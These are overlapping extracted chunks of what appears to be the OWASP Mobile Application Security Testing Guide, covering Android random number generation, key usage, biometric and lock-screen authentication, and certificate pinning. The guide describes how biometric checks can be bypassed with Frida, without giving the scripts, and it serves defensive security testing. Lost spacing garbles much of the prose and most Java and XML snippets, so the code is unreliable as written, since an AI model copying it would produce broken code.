Overview Static Analysis Identifyalltheinstancesofrandomnumbergeneratorsandlookforeithercustomorwell-knowninsecureclasses. For instance, java.util.Randomproducesanidenticalsequenceofnumbersforeachgivenseedvalue; consequently, the sequenceofnumbersispredictable. Insteadawell-vettedalgorithmshouldbechosenthatiscurrentlyconsideredtobe strongbyexpertsinthefield,andawell-testedimplementationswithadequatelengthseedsshouldbeused. IdentifyallinstancesofSecureRandomthatarenotcreatedusingthedefaultconstructor. Specifyingtheseedvaluemay reducerandomness. Prefertheno-argumentconstructorofSecureRandomthatusesthesystem-specifiedseedvalueto generatea128-byte-longrandomnumber. Ingeneral,ifaPRNGisnotadvertisedasbeingcryptographicallysecure(e.g.java.util.Random),thenitisprobablya statisticalPRNGandshouldnotbeusedinsecurity-sensitivecontexts. Pseudo-randomnumbergeneratorscanproduce predictablenumbersifthegeneratorisknownandtheseedcanbeguessed. A128-bitseedisagoodstartingpointfor producinga“randomenough”number. Onceanattackerknowswhattypeofweakpseudo-randomnumbergenerator(PRNG)isused,itcanbetrivialtowritea proof-of-concepttogeneratethenextrandomvaluebasedonpreviouslyobservedones,asitwasdoneforJavaRandom. In case of very weak custom random generators it may be possible to observe the pattern statistically. Although the recommendedapproachwouldanywaybetodecompiletheAPKandinspectthealgorithm(seeStaticAnalysis). Ifyouwanttotestforrandomness,youcantrytocapturealargesetofnumbersandcheckwiththeBurp’ssequencerto seehowgoodthequalityoftherandomnessis. Dynamic Analysis Youcanusemethodtracingonthementionedclassesandmethodstodetermineinput/outputvaluesbeingused. 225\\nTesting the Purposes of Keys Platform: android MASVSV1: MSTG-CRYPTO-5 MASVSV2: MASVS-CRYPTO-2 Overview Static Analysis Identifyallinstanceswherecryptographyisused. Youcanlookfor: • classesCipher,Mac,MessageDigest,Signature • interfacesKey,PrivateKey,PublicKey,SecretKey • functionsgetInstance,generateKey • exceptionsKeyStoreException,CertificateException,NoSuchAlgorithmException • classesimportingjava.security.*,javax.crypto.*,android.security.*,android.security.keystore.* Foreachidentifiedinstance,identifyitspurposeanditstype. Itcanbeused: • forencryption/decryption-toensuredataconfidentiality • forsigning/verifying-toensureintegrityofdata(aswellasaccountabilityinsomecases) • formaintenance-toprotectkeysduringcertainsensitiveoperations(suchasbeingimportedtotheKeyStore) Additionally,youshouldidentifythebusinesslogicwhichusesidentifiedinstancesofcryptography. Duringverificationthefollowingchecksshouldbeperformed: • areallkeysusedaccordingtothepurposedefinedduringitscreation? (itisrelevanttoKeyStorekeys,whichcan haveKeyPropertiesdefined) • forasymmetrickeys,istheprivatekeybeingexclusivelyusedforsigningandthepublickeyencryption? • aresymmetrickeysusedformultiplepurposes? Anewsymmetrickeyshouldbegeneratedifit’susedinadifferent context. • iscryptographyusedaccordingtoitsbusinesspurpose? Dynamic Analysis Youcanusemethodtracingoncryptographicmethodstodetermineinput/outputvaluessuchasthekeysthatarebeing used. Monitor file system access while cryptographic operations are being performed to assess where key material is writtentoorreadfrom. Forexample,monitorthefilesystembyusingtheAPImonitorofRMS-RuntimeMobileSecurity. 226\\nAndroid Local Authentication Overview During local authentication, an app authenticates the user against credentials stored locally on the device. In other words, the user “unlocks” the app or some inner",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 90
    }
  },
  {
    "text": "Youcanusemethodtracingoncryptographicmethodstodetermineinput/outputvaluessuchasthekeysthatarebeing used. Monitor file system access while cryptographic operations are being performed to assess where key material is writtentoorreadfrom. Forexample,monitorthefilesystembyusingtheAPImonitorofRMS-RuntimeMobileSecurity. 226\\nAndroid Local Authentication Overview During local authentication, an app authenticates the user against credentials stored locally on the device. In other words, the user “unlocks” the app or some inner layer of functionality by providing a valid PIN, password or biometric characteristics such as face or fingerprint, which is verified by referencing local data. Generally, this is done so that userscanmoreconvenientlyresumeanexistingsessionwitharemoteserviceorasameansofstep-upauthentication toprotectsomecriticalfunction. Asstatedbeforeinchapter“MobileAppAuthenticationArchitectures”: Thetestershouldbeawarethatlocalauthentica- tionshouldalwaysbeenforcedataremoteendpointorbasedonacryptographicprimitive. Attackerscaneasilybypass localauthenticationifnodatareturnsfromtheauthenticationprocess. OnAndroid,therearetwomechanismssupportedbytheAndroidRuntimeforlocalauthentication: theConfirmCredential flowandtheBiometricAuthenticationflow. Confirm Credential Flow TheconfirmcredentialflowisavailablesinceAndroid6.0andisusedtoensurethatusersdonothavetoenterapp-specific passwordstogetherwiththelockscreenprotection. Instead: ifauserhasloggedintothedevicerecently,thenconfirm- credentialscanbeusedtounlockcryptographicmaterialsfromtheAndroidKeystore. Thatis,iftheuserunlockedthe devicewithinthesettimelimits(setUserAuthenticationValidityDurationSeconds),otherwisethedeviceneedstobe unlockedagain. NotethatthesecurityofConfirmCredentialsisonlyasstrongastheprotectionsetatthelockscreen. Thisoftenmeans thatsimplepredictivelock-screenpatternsareusedandthereforewedonotrecommendanyappswhichrequireL2of securitycontrolstouseConfirmCredentials. Biometric Authentication Flow Biometricauthenticationisaconvenientmechanismforauthentication,butalsointroducesanadditionalattacksurface whenusingit. TheAndroiddeveloperdocumentationgivesaninterestingoverviewandindicatorsformeasuringbiometric unlocksecurity. TheAndroidplatformoffersthreedifferentclassesforbiometricauthentication: • Android10(APIlevel29)andhigher: BiometricManager • Android9(APIlevel28)andhigher: BiometricPrompt • Android6.0(APIlevel23)andhigher: FingerprintManager(deprecatedinAndroid9(APIlevel28)) 227\\nTheclassBiometricManagercanbeusedtoverifyifbiometrichardwareisavailableonthedeviceandifit’sconfigured bytheuser. Ifthat’sthecase,theclassBiometricPromptcanbeusedtoshowasystem-providedbiometricdialog. TheBiometricPromptclassisasignificantimprovement,asitallowstohaveaconsistentUIforbiometricauthentication onAndroidandalsosupportsmoresensorsthanjustfingerprint. This is different to the FingerprintManager class which only supports fingerprint sensors and provides no UI, forcing developerstobuildtheirownfingerprintUI. AverydetailedoverviewandexplanationoftheBiometricAPIonAndroidwaspublishedontheAndroidDeveloperBlog. FingerprintManager (deprecated in Android 9 (API level 28)) Android 6.0 (API level 23) introduced public APIs for authenticating users via fingerprint, but is deprecated in Android 9 (API level 28). Access to the fingerprint hardware is provided through the FingerprintManager class. An app can request fingerprint authentication by instantiating aFingerprintManager object and calling its authenticate method. Thecallerregisterscallbackmethodstohandlepossibleoutcomesoftheauthenticationprocess(i.e.success,failure,or error). Notethatthismethoddoesn’tconstitutestrongproofthatfingerprintauthenticationhasactuallybeenperformed -forexample,theauthenticationstepcouldbepatchedoutbyanattacker,orthe“success”callbackcouldbeoverloaded usingdynamicinstrumentation. You can achieve better security by using the fingerprint API in conjunction with the Android KeyGenerator class. With thisapproach,asymmetrickeyisstoredintheAndroidKeyStoreandunlockedwiththeuser’sfingerprint. Forexample, to enable user access to a remote service, an AES key is created which encrypts the authentication token. By calling setUserAuthenticationRequired(true)whencreatingthekey,itisensuredthattheusermustre-authenticatetore- trieveit. Theencryptedauthenticationtokencanthenbesaveddirectlyonthedevice(e.g.viaSharedPreferences). This designisarelativelysafewaytoensuretheuseractuallyenteredanauthorizedfingerprint. Anevenmoresecureoptionisusingasymmetriccryptography. Here,themobileappcreatesanasymmetrickeypairin theKeyStoreandenrollsthepublickeyontheserverbackend. Latertransactionsarethensignedwiththeprivatekey andverifiedbytheserverusingthepublickey. 228\\nBiometric Library AndroidprovidesalibrarycalledBiometricwhichoffersacompatibilityversionoftheBiometricPromptandBiometric- ManagerAPIs,asimplementedinAndroid10,withfullfeaturesupportbacktoAndroid6.0(API23). YoucanfindareferenceimplementationandinstructionsonhowtoshowabiometricauthenticationdialogintheAndroid developerdocumentation. There are two authenticate methods available in the BiometricPrompt class. One of them expects a CryptoObject, whichaddsanadditionallayerofsecurityforthebiometricauthentication. TheauthenticationflowwouldbeasfollowswhenusingCryptoObject: • TheappcreatesakeyintheKeyStorewithsetUserAuthenticationRequiredandsetInvalidatedByBiometri- cEnrollmentsettotrue. Additionally,setUserAuthenticationValidityDurationSecondsshouldbesetto-1. • Thiskeyisusedtoencryptinformationthatisauthenticatingtheuser(e.g.sessioninformationorauthentication token). • AvalidsetofbiometricsmustbepresentedbeforethekeyisreleasedfromtheKeyStoretodecryptthedata,which isvalidatedthroughtheauthenticatemethodandtheCryptoObject. • This solution cannot be bypassed, even on rooted devices, as the key from the KeyStore can only be used after successfulbiometricauthentication. If CryptoObject is not used as part of the authenticate method, it can be bypassed by using Frida. See the “Dynamic Instrumentation”sectionformoredetails. DeveloperscanuseseveralvalidationclassesofferedbyAndroidtotesttheimplementationofbiometricauthentication intheirapp. FingerprintManager ThissectiondescribeshowtoimplementbiometricauthenticationbyusingtheFingerprintManagerclass. Please keepinmindthatthisclassisdeprecatedandtheBiometriclibraryshouldbeusedinsteadasabestpractice. This sectionisjustforreference,incaseyoucomeacrosssuchanimplementationandneedtoanalyzeit. Begin by searching for FingerprintManager.authenticate calls. The first parameter passed to this method should be a CryptoObject instance which is a wrapper class for crypto objects supported by FingerprintManager. Should the parameterbesettonull,thismeansthefingerprintauthorizationispurelyevent-bound,likelycreatingasecurityissue. ThecreationofthekeyusedtoinitializethecipherwrappercanbetracedbacktotheCryptoObject. Verifythekeywas bothcreatedusingtheKeyGeneratorclassinadditiontosetUserAuthenticationRequired(true)beingcalledduring creationoftheKeyGenParameterSpecobject(seecodesamplesbelow). Makesuretoverifytheauthenticationlogic. Fortheauthenticationtobesuccessful,theremoteendpointmustrequire theclienttopresentthesecretretrievedfromtheKeyStore,avaluederivedfromthesecret,oravaluesignedwiththe clientprivatekey(seeabove). Safelyimplementingfingerprintauthenticationrequiresfollowingafewsimpleprinciples,startingbyfirstcheckingifthat typeofauthenticationisevenavailable. Onthemostbasicfront, thedevicemustrunAndroid6.0orhigher(API23+). Fourotherprerequisitesmustalsobeverified: • ThepermissionmustberequestedintheAndroidManifest: <uses-permission android:name=\"android.permission.USE_FINGERPRINT\" /> • Fingerprinthardwaremustbeavailable: FingerprintManagerfingerprintManager =(FingerprintManager) context.getSystemService(Context.FINGERPRINT_SERVICE); fingerprintManager.isHardwareDetected(); • Theusermusthaveaprotectedlockscreen: KeyguardManagerkeyguardManager =(KeyguardManager)context.getSystemService(Context.KEYGUARD_SERVICE); keyguardManager.isKeyguardSecure(); //noteifthisisnotthecase:asktheusertosetupaprotectedlockscreen 229\\n• Atleastonefingershouldberegistered: fingerprintManager.hasEnrolledFingerprints(); • Theapplicationshouldhavepermissiontoaskforauserfingerprint: context.checkSelfPermission(Manifest.permission.USE_FINGERPRINT)==PermissionResult.PERMISSION_GRANTED; Ifanyoftheabovechecksfail,theoptionforfingerprintauthenticationshouldnotbeoffered. ItisimportanttorememberthatnoteveryAndroiddeviceoffershardware-backedkeystorage. TheKeyInfoclasscanbe usedtofindoutwhetherthekeyresidesinsidesecurehardwaresuchasaTrustedExecutionEnvironment(TEE)orSecure Element(SE). SecretKeyFactoryfactory =SecretKeyFactory.getInstance(getEncryptionKey().getAlgorithm(),ANDROID_KEYSTORE); KeyInfosecetkeyInfo =(KeyInfo)factory.getKeySpec(yourencryptionkeyhere,KeyInfo.class); secetkeyInfo.isInsideSecureHardware() On certain systems, it is possible to enforce the policy for biometric authentication through hardware as well. This is checkedby: keyInfo.isUserAuthenticationRequirementEnforcedBySecureHardware(); Thefollowingdescribeshowtodofingerprintauthenticationusingasymmetrickeypair. Fingerprint authentication may be implemented by creating a new AES key using the KeyGenerator class by adding setUserAuthenticationRequired(true)inKeyGenParameterSpec.Builder. generator =KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES,KEYSTORE); generator.init(newKeyGenParameterSpec.Builder (KEY_ALIAS, KeyProperties.PURPOSE_ENCRYPT |KeyProperties.PURPOSE_DECRYPT) .setBlockModes(KeyProperties.BLOCK_MODE_CBC) .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_PKCS7) .setUserAuthenticationRequired(true) .build() ); generator.generateKey(); Toperformencryptionordecryptionwiththeprotectedkey,createaCipherobjectandinitializeitwiththekeyalias. SecretKeykeyspec =(SecretKey)keyStore.getKey(KEY_ALIAS,null); if(mode ==Cipher.ENCRYPT_MODE){ cipher.init(mode,keyspec); Keep in mind, a new key cannot be used immediately - it has to be authenticated through the FingerprintMan- ager first.",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 91
    }
  },
  {
    "text": "a new AES key using the KeyGenerator class by adding setUserAuthenticationRequired(true)inKeyGenParameterSpec.Builder. generator =KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES,KEYSTORE); generator.init(newKeyGenParameterSpec.Builder (KEY_ALIAS, KeyProperties.PURPOSE_ENCRYPT |KeyProperties.PURPOSE_DECRYPT) .setBlockModes(KeyProperties.BLOCK_MODE_CBC) .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_PKCS7) .setUserAuthenticationRequired(true) .build() ); generator.generateKey(); Toperformencryptionordecryptionwiththeprotectedkey,createaCipherobjectandinitializeitwiththekeyalias. SecretKeykeyspec =(SecretKey)keyStore.getKey(KEY_ALIAS,null); if(mode ==Cipher.ENCRYPT_MODE){ cipher.init(mode,keyspec); Keep in mind, a new key cannot be used immediately - it has to be authenticated through the FingerprintMan- ager first. This involves wrapping the Cipher object into FingerprintManager.CryptoObject which is passed to FingerprintManager.authenticatebeforeitwillberecognized. cryptoObject =newFingerprintManager.CryptoObject(cipher); fingerprintManager.authenticate(cryptoObject,newCancellationSignal(),0,this,null); The callback method onAuthenticationSucceeded(FingerprintManager.AuthenticationResult result) is called whentheauthenticationsucceeds. TheauthenticatedCryptoObjectcanthenberetrievedfromtheresult. public void authenticationSucceeded(FingerprintManager.AuthenticationResult result){ cipher =result.getCryptoObject().getCipher(); //(...dosomethingwiththeauthenticatedcipherobject...) } Thefollowingdescribeshowtodofingerprintauthenticationusinganasymmetrickeypair. To implement fingerprint authentication using asymmetric cryptography, first create a signing key using the KeyPair- Generatorclass,andenrollthepublickeywiththeserver. Youcanthenauthenticatepiecesofdatabysigningthemon 230\\ntheclientandverifyingthesignatureontheserver. Adetailedexampleforauthenticatingtoremoteserversusingthe fingerprintAPIcanbefoundintheAndroidDevelopersBlog. Akeypairisgeneratedasfollows: KeyPairGenerator.getInstance(KeyProperties.KEY_ALGORITHM_EC,\"AndroidKeyStore\"); keyPairGenerator.initialize( newKeyGenParameterSpec.Builder(MY_KEY, KeyProperties.PURPOSE_SIGN) .setDigests(KeyProperties.DIGEST_SHA256) .setAlgorithmParameterSpec(newECGenParameterSpec(\"secp256r1\")) .setUserAuthenticationRequired(true) .build()); keyPairGenerator.generateKeyPair(); Tousethekeyforsigning,youneedtoinstantiateaCryptoObjectandauthenticateitthroughFingerprintManager. Signature.getInstance(\"SHA256withECDSA\"); KeyStorekeyStore =KeyStore.getInstance(\"AndroidKeyStore\"); keyStore.load(null); PrivateKeykey =(PrivateKey)keyStore.getKey(MY_KEY,null); signature.initSign(key); CryptoObjectcryptoObject =newFingerprintManager.CryptoObject(signature); CancellationSignalcancellationSignal =newCancellationSignal(); FingerprintManagerfingerprintManager = context.getSystemService(FingerprintManager.class); fingerprintManager.authenticate(cryptoObject,cancellationSignal,0,this,null); YoucannowsignthecontentsofabytearrayinputBytesasfollows. Signaturesignature =cryptoObject.getSignature(); signature.update(inputBytes); byte[]signed =signature.sign(); • Notethatincaseswheretransactionsaresigned,arandomnonceshouldbegeneratedandaddedtothesigned data. Otherwise,anattackercouldreplaythetransaction. • Toimplementauthenticationusingsymmetricfingerprintauthentication,useachallenge-responseprotocol. Additional Security Features Android 7.0 (API level 24) adds the setInvalidatedByBiometricEnrollment(boolean invalidateKey) method to KeyGenParameterSpec.Builder. When invalidateKey value is set to true (the default), keys that are valid for fingerprintauthenticationareirreversiblyinvalidatedwhenanewfingerprintisenrolled. Thispreventsanattackerfrom retrievingtheykeyeveniftheyareabletoenrollanadditionalfingerprint. Android8.0(APIlevel26)addstwoadditionalerrorcodes: • FINGERPRINT_ERROR_LOCKOUT_PERMANENT:Theuserhastriedtoomanytimestounlocktheirdeviceusingthefin- gerprintreader. • FINGERPRINT_ERROR_VENDOR:Avendor-specificfingerprintreadererroroccurred. Implementing biometric authentication Reassurethatthelockscreenisset: KeyguardManagermKeyguardManager =(KeyguardManager)getSystemService(Context.KEYGUARD_SERVICE); if(!mKeyguardManager.isKeyguardSecure()){ //Showamessagethattheuserhasn'tsetupalockscreen. } • Createthekeyprotectedbythelockscreen. Inordertousethiskey,theuserneedstohaveunlockedthedevice inthelastXseconds,orthedeviceneedstobeunlockedagain. Makesurethatthistimeoutisnottoolong,asit becomeshardertoensurethatitwasthesameuserusingtheappastheuserunlockingthedevice: 231\\ntry{ KeyStorekeyStore =KeyStore.getInstance(\"AndroidKeyStore\"); keyStore.load(null); KeyGeneratorkeyGenerator =KeyGenerator.getInstance( KeyProperties.KEY_ALGORITHM_AES,\"AndroidKeyStore\"); //Set thealiasoftheentryinAndroidKeyStorewherethekeywillappear //and theconstrains(purposes)intheconstructoroftheBuilder keyGenerator.init(newKeyGenParameterSpec.Builder(KEY_NAME, KeyProperties.PURPOSE_ENCRYPT |KeyProperties.PURPOSE_DECRYPT) .setBlockModes(KeyProperties.BLOCK_MODE_CBC) .setUserAuthenticationRequired(true) //Require thattheuserhasunlockedinthelast30seconds .setUserAuthenticationValidityDurationSeconds(30) .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_PKCS7) .build()); keyGenerator.generateKey(); }catch (NoSuchAlgorithmException |NoSuchProviderException |InvalidAlgorithmParameterException |KeyStoreException |CertificateException |IOExceptione){ throw newRuntimeException(\"Failedtocreateasymmetrickey\",e); } • Setupthelockscreentoconfirm: private static final intREQUEST_CODE_CONFIRM_DEVICE_CREDENTIALS =1;//usedasanumbertoverifywhetherthisiswheretheactivityresultsfrom Intentintent =mKeyguardManager.createConfirmDeviceCredentialIntent(null,null); if(intent !=null){ startActivityForResult(intent,REQUEST_CODE_CONFIRM_DEVICE_CREDENTIALS); } • Usethekeyafterlockscreen: @Override protected void onActivityResult(intrequestCode,intresultCode,Intentdata){ if(requestCode ==REQUEST_CODE_CONFIRM_DEVICE_CREDENTIALS){ //Challenge completed,proceedwithusingcipher if(resultCode ==RESULT_OK){ //usethe keyfortheactualauthenticationflow }else { //The usercanceledordidn’tcompletethelockscreen //operation. Gotoerror/cancellationflow. } } } Third party SDKs Make sure that fingerprint authentication and/or other types of biometric authentication are exclusively based on the AndroidSDKanditsAPIs. Ifthisisnotthecase,ensurethatthealternativeSDKhasbeenproperlyvettedforanyweak- nesses. MakesurethattheSDKisbackedbytheTEE/SEwhichunlocksa(cryptographic)secretbasedonthebiometric authentication. Thissecretshouldnotbeunlockedbyanythingelse,butavalidbiometricentry. Thatway,itshouldnever bethecasethatthefingerprintlogiccanbebypassed. Testing Biometric Authentication Platform: android MASVSV1: MSTG-AUTH-8 MASVSV2: MASVS-AUTH-2 Overview Static Analysis Note that there are quite some vendor/third party SDKs, which provide biometric support, but which have their own insecurities. BeverycautiouswhenusingthirdpartySDKstohandlesensitiveauthenticationlogic. 232\\nDynamic Analysis Please take a look at this detailed blog article about the Android KeyStore and Biometric authentication. This research includes two Frida scripts which can be used to test insecure implementations of biometric authentication and try to bypassthem: • Fingerprintbypass: ThisFridascriptwillbypassauthenticationwhentheCryptoObjectisnotusedintheauthen- ticate method of the BiometricPrompt class. The authentication implementation relies on the callback onAu- thenticationSuccededbeingcalled. • Fingerprintbypassviaexceptionhandling: ThisFridascriptwillattempttobypassauthenticationwhentheCryp- toObjectisused,butusedinanincorrectway. Thedetailedexplanationcanbefoundinthesection“CryptoObject ExceptionHandling”intheblogpost. Testing Confirm Credentials Platform: android MASVSV1: MSTG-AUTH-1,MSTG-STORAGE-11 MASVSV2: MASVS-AUTH-2 Overview Static Analysis Makesurethattheunlockedkeyisusedduringtheapplicationflow. Forexample,thekeymaybeusedtodecryptlocal storageoramessagereceivedfromaremoteendpoint. Iftheapplicationsimplycheckswhethertheuserhasunlocked thekeyornot,theapplicationmaybevulnerabletoalocalauthenticationbypass. Dynamic Analysis Validatethedurationoftime(seconds)forwhichthekeyisauthorizedtobeusedaftertheuserissuccessfullyauthenti- cated. ThisisonlyneededifsetUserAuthenticationRequiredisused. 233\\nAndroid Network Communication Overview AlmosteveryAndroidappactsasaclienttooneormoreremoteservices. Asthisnetworkcommunicationusuallytakes placeoveruntrustednetworkssuchaspublicWi-Fi,classicalnetworkbased-attacksbecomeapotentialissue. Most modern mobile apps use variants of HTTP-based web services, as these protocols are well-documented and sup- ported. Android Network Security Configuration Starting on Android 7.0 (API level 24), Android apps can customize their network security settings using the so-called NetworkSecurityConfigurationfeaturewhichoffersthefollowingkeycapabilities: • Cleartexttraffic: Protectappsfromaccidentalusageofcleartexttraffic(orenablesit). • Customtrustanchors: CustomizewhichCertificateAuthorities(CAs)aretrustedforanapp’ssecureconnections. Forexample,trustingparticularself-signedcertificatesorrestrictingthesetofpublicCAsthattheapptrusts. • Certificatepinning: Restrictanapp’ssecureconnectiontoparticularcertificates. • Debug-onlyoverrides: Safelydebugsecureconnectionsinanappwithoutaddedrisktotheinstalledbase. If an app defines a custom Network Security Configuration, you can obtain its location by searching for an- droid:networkSecurityConfigintheAndroidManifest.xmlfile. <application android:networkSecurityConfig=\"@xml/network_security_config\" Inthiscasethefileislocatedat@xml(equivalentto/res/xml)andhasthename“network_security_config”(whichmight vary). Youshouldbeabletofinditas“res/xml/network_security_config.xml”. Ifaconfigurationexists,thefollowingevent shouldbevisibleinthesystemlogs: D/NetworkSecurityConfig:UsingNetworkSecurityConfigfromresourcenetwork_security_config TheNetworkSecurityConfigurationisXML-basedandcanbeusedtoconfigureapp-wideanddomain-specificsettings: • base-configappliestoallconnectionsthattheappattemptstomake. • domain-configoverridesbase-configforspecificdomains(itcancontainmultipledomainentries).",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 92
    }
  },
  {
    "text": "settings using the so-called NetworkSecurityConfigurationfeaturewhichoffersthefollowingkeycapabilities: • Cleartexttraffic: Protectappsfromaccidentalusageofcleartexttraffic(orenablesit). • Customtrustanchors: CustomizewhichCertificateAuthorities(CAs)aretrustedforanapp’ssecureconnections. Forexample,trustingparticularself-signedcertificatesorrestrictingthesetofpublicCAsthattheapptrusts. • Certificatepinning: Restrictanapp’ssecureconnectiontoparticularcertificates. • Debug-onlyoverrides: Safelydebugsecureconnectionsinanappwithoutaddedrisktotheinstalledbase. If an app defines a custom Network Security Configuration, you can obtain its location by searching for an- droid:networkSecurityConfigintheAndroidManifest.xmlfile. <application android:networkSecurityConfig=\"@xml/network_security_config\" Inthiscasethefileislocatedat@xml(equivalentto/res/xml)andhasthename“network_security_config”(whichmight vary). Youshouldbeabletofinditas“res/xml/network_security_config.xml”. Ifaconfigurationexists,thefollowingevent shouldbevisibleinthesystemlogs: D/NetworkSecurityConfig:UsingNetworkSecurityConfigfromresourcenetwork_security_config TheNetworkSecurityConfigurationisXML-basedandcanbeusedtoconfigureapp-wideanddomain-specificsettings: • base-configappliestoallconnectionsthattheappattemptstomake. • domain-configoverridesbase-configforspecificdomains(itcancontainmultipledomainentries). Forexample,thefollowingconfigurationusesthebase-configtopreventcleartexttrafficforalldomains. Butitoverrides thatruleusingadomain-config,explicitlyallowingcleartexttrafficforlocalhost. <?xml version=\"1.0\" encoding=\"utf-8\"?> <network-security-config> <base-config cleartextTrafficPermitted=\"false\" /> <domain-config cleartextTrafficPermitted=\"true\"> <domain>localhost</domain> </domain-config> </network-security-config> Learnmore: • “ASecurityAnalyst’sGuidetoNetworkSecurityConfigurationinAndroidP” • AndroidDevelopers-NetworkSecurityConfiguration • AndroidCodelab-NetworkSecurityConfiguration Default Configurations ThedefaultconfigurationforappstargetingAndroid9(APIlevel28)andhigherisasfollows: 234\\n<base-config cleartextTrafficPermitted=\"false\"> <trust-anchors> <certificates src=\"system\" /> </trust-anchors> </base-config> ThedefaultconfigurationforappstargetingAndroid7.0(APIlevel24)toAndroid8.1(APIlevel27)isasfollows: <base-config cleartextTrafficPermitted=\"true\"> <trust-anchors> <certificates src=\"system\" /> </trust-anchors> </base-config> ThedefaultconfigurationforappstargetingAndroid6.0(APIlevel23)andlowerisasfollows: <base-config cleartextTrafficPermitted=\"true\"> <trust-anchors> <certificates src=\"system\" /> <certificates src=\"user\" /> </trust-anchors> </base-config> Certificate Pinning The Network Security Configuration can also be used to pin declarative certificates to specific domains. This is done by providing a <pin-set> in the Network Security Configuration, which is a set of digests (hashes) of the public key (SubjectPublicKeyInfo)ofthecorrespondingX.509certificate. Whenattemptingtoestablishaconnectiontoaremoteendpoint,thesystemwill: • Getandvalidatetheincomingcertificate. • Extractthepublickey. • Calculateadigestovertheextractedpublickey. • Comparethedigestwiththesetoflocalpins. If at least one of the pinned digests matches, the certificate chain will be considered valid and the connection will pro- ceed. <?xml version=\"1.0\" encoding=\"utf-8\"?> <network-security-config> <domain-config> UsecertificatepinningforOWASPwebsiteaccessincludingsubdomains <domain includeSubdomains=\"true\">owasp.org</domain> <pin-set expiration=\"2018/8/10\"> <!--Hashofthepublickey(SubjectPublicKeyInfooftheX.509certificate)of theIntermediateCAoftheOWASPwebsiteservercertificate--> <pindigest=\"SHA-256\">YLh1dUR9y6Kja30RrAn7JKnbQG/uEtLMkBgFF2Fuihg=</pin> <!--Hashofthepublickey(SubjectPublicKeyInfooftheX.509certificate)of theRootCAoftheOWASPwebsiteservercertificate--> <pindigest=\"SHA-256\">Vjs8r4z+80wjNcr1YKepWQboSIRi63WsWXhIMN+eWys=</pin> </pin-set> </domain-config> </network-security-config> Security Provider AndroidreliesonasecurityprovidertoprovideSSL/TLS-basedconnections. Theproblemwiththiskindofsecurityprovider (oneexampleisOpenSSL),whichcomeswiththedevice,isthatitoftenhasbugsand/orvulnerabilities. Toavoidknownvulnerabilities, developersneedtomakesurethattheapplicationwillinstallapropersecurityprovider. SinceJuly11, 2016, GooglehasbeenrejectingPlayStoreapplicationsubmissions(bothnewapplicationsandupdates) thatusevulnerableversionsofOpenSSL. Testing Custom Certificate Stores and Certificate Pinning 235\\nPlatform: android MASVSV1: MSTG-NETWORK-4 MASVSV2: MASVS-NETWORK-2 Overview Static Analysis Network Security Configuration InspecttheNetworkSecurityConfigurationlookingforany<pin-set>elements. Checktheirexpirationdate,ifany. If expired,certificatepinningwillbedisabledfortheaffecteddomains. TestingTip: Ifacertificatepinningvalidationcheckhasfailed,thefollowingeventshouldbeloggedinthesystem logs: I/X509Util:Failedtovalidatethecertificatechain,error:Pinverificationfailed TrustManager Implementingcertificatepinninginvolvesthreemainsteps: • Obtainthecertificateofthedesiredhost(s). • Makesurethecertificateisin.bksformat. • PinthecertificatetoaninstanceofthedefaultApacheHttpclient. Toanalyzethecorrectimplementationofcertificatepinning,theHTTPclientshouldloadtheKeyStore: InputStreamin =resources.openRawResource(certificateRawResource); keyStore =KeyStore.getInstance(\"BKS\"); keyStore.load(resourceStream,password); OncetheKeyStorehasbeenloaded,wecanusetheTrustManagerthattruststheCAsinourKeyStore: StringtmfAlgorithm =TrustManagerFactory.getDefaultAlgorithm(); TrustManagerFactorytmf =TrustManagerFactory.getInstance(tmfAlgorithm); tmf.init(keyStore); //CreateanSSLContextthatusestheTrustManager //SSLContextcontext=SSLContext.getInstance(\"TLS\"); sslContext.init(null,tmf.getTrustManagers(),null); Theapp’simplementationmaybedifferent, pinningagainstthecertificate’spublickeyonly, thewholecertificate, ora wholecertificatechain. Network Libraries and WebViews Applicationsthatusethird-partynetworkinglibrariesmayutilizethelibraries’certificatepinningfunctionality. Forexample, okhttpcanbesetupwiththeCertificatePinnerasfollows: OkHttpClientclient =newOkHttpClient.Builder() .certificatePinner(newCertificatePinner.Builder() .add(\"example.com\",\"sha256/UwQAapahrjCOjYI3oLUx5AQxPBR02Jz6/E2pt0IeLXA=\") .build()) .build(); ApplicationsthatuseaWebViewcomponentmayutilizetheWebViewClient’seventhandlerforsomekindof“certificate pinning”ofeachrequestbeforethetargetresourceisloaded. Thefollowingcodeshowsanexampleverification: 236\\nWebViewmyWebView =(WebView)findViewById(R.id.webview); myWebView.setWebViewClient(newWebViewClient(){ private StringexpectedIssuerDN =\"CN=Let'sEncryptAuthorityX3,O=Let'sEncrypt,C=US;\"; @Override public void onLoadResource(WebViewview,Stringurl) { //FromAndroidAPIdocumentationabout\"WebView.getCertificate()\": //GetstheSSLcertificateforthemaintop-levelpage //ornullifthereisnocertificate(thesiteisnotsecure). // //AvailableinformationonSslCertificateclassare\"IssuerDN\",\"SubjectDN\"andvaliditydatehelpers SslCertificateserverCert =view.getCertificate(); if(serverCert !=null){ //applyeithercertificateorpublickeypinningcomparisonhere //Throwexceptiontocancelresourceloading... } } } }); Alternatively, itisbettertouseanOkHttpClientwithconfiguredpinsandletitactasaproxyoverridingshouldInter- ceptRequestoftheWebViewClient. Xamarin Applications ApplicationsdevelopedinXamarinwilltypicallyuseServicePointManagertoimplementpinning. Normallyafunctioniscreatedtocheckthecertificate(s)andreturnthebooleanvaluetothemethodServerCertificat- eValidationCallback: [Activity(Label =\"XamarinPinning\",MainLauncher =true)] public class MainActivity :Activity { //SupportedPublicKey-Hexadecimalvalueofthepublickey. //UseGetPublicKeyString()methodtodeterminethepublickeyofthecertificatewewanttopin.Uncommentthedebugcode inthe ↪ ValidateServerCertificatefunctionafirsttimetodeterminethevaluetopin. private const string SupportedPublicKey =\"3082010A02820101009CD30CF05AE52E47B7725D3783B...\";//Shortened forreadability private static bool ValidateServerCertificate( object sender, X509Certificatecertificate, X509Chainchain, SslPolicyErrorssslPolicyErrors ) { //Log.Debug(\"XamarinPinning\",chain.ChainElements[X].Certificate.GetPublicKeyString()); //returntrue; return SupportedPublicKey ==chain.ChainElements[1].Certificate.GetPublicKeyString(); } protected override void 